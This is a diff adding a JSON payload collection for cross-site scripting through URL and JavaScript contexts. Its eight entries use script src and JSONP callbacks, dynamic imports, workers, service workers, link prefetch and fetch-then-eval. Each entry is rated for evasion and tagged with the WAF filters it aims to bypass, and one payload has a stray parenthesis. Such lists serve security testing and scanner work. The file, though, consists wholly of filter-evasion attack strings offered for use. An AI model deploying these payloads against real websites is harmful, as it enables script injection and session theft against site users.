@@ -1,0 +1,145 @@
+{
+  "category": "url_js_context",
+  "description": "Script src constructed from query string and URL context injection",
+  "difficulty": "advanced",
+  "payloads": [
+    {
+      "name": "script_src_query_injection",
+      "payload": "<script src=\"/js/lib.js?cb=alert(1)//\"></script>",
+      "description": "Script src with query parameter injection",
+      "context": [
+        "script_src",
+        "query_parameter",
+        "callback",
+        "url_injection"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "script_src_filters",
+        "query_injection_detection"
+      ]
+    },
+    {
+      "name": "jsonp_callback_injection",
+      "payload": "<script src=\"/api/data?callback=alert(1)//\"></script>",
+      "description": "JSONP callback parameter injection",
+      "context": [
+        "jsonp",
+        "callback",
+        "api_endpoint",
+        "parameter_injection"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "jsonp_filters",
+        "callback_detection"
+      ]
+    },
+    {
+      "name": "dynamic_script_construction",
+      "payload": "var s=document.createElement('script');s.src='/js/lib.js?cb='+encodeURIComponent('alert(1)//');document.body.appendChild(s);",
+      "description": "Dynamic script element with URL injection",
+      "context": [
+        "createElement",
+        "script",
+        "dynamic_src",
+        "encodeURIComponent"
+      ],
+      "encoding": "url_encoding",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "dynamic_script_detection",
+        "createElement_filters"
+      ]
+    },
+    {
+      "name": "import_statement_injection",
+      "payload": "import('/js/module.js?cb=alert(1)//').then(m=>m.default());",
+      "description": "ES6 import statement with URL injection",
+      "context": [
+        "import",
+        "es6_modules",
+        "dynamic_import",
+        "url_parameter"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "import_filters",
+        "es6_detection",
+        "dynamic_import_detection"
+      ]
+    },
+    {
+      "name": "worker_script_injection",
+      "payload": "new Worker('/js/worker.js?cb=alert(1)//'))",
+      "description": "Web Worker script injection via URL",
+      "context": [
+        "Worker",
+        "web_worker",
+        "worker_script",
+        "url_injection"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "worker_filters",
+        "web_worker_detection"
+      ]
+    },
+    {
+      "name": "serviceworker_injection",
+      "payload": "navigator.serviceWorker.register('/sw.js?cb=alert(1)//')",
+      "description": "Service Worker registration with URL injection",
+      "context": [
+        "serviceWorker",
+        "registration",
+        "service_worker",
+        "url_parameter"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "serviceworker_filters",
+        "registration_detection"
+      ]
+    },
+    {
+      "name": "link_prefetch_injection",
+      "payload": "<link rel=prefetch href=\"/js/lib.js?cb=alert(1)//\">",
+      "description": "Link prefetch with URL parameter injection",
+      "context": [
+        "link",
+        "prefetch",
+        "href",
+        "resource_hint"
+      ],
+      "encoding": "none",
+      "evasion_level": 7,
+      "waf_bypass": [
+        "prefetch_filters",
+        "link_href_detection"
+      ]
+    },
+    {
+      "name": "fetch_script_injection",
+      "payload": "fetch('/api/script?cb=alert(1)//').then(r=>r.text()).then(eval);",
+      "description": "Fetch API with eval of injected script",
+      "context": [
+        "fetch",
+        "eval",
+        "text_response",
+        "url_injection"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "fetch_filters",
+        "eval_detection",
+        "response_eval_detection"
+      ]
+    }
+  ]
+}
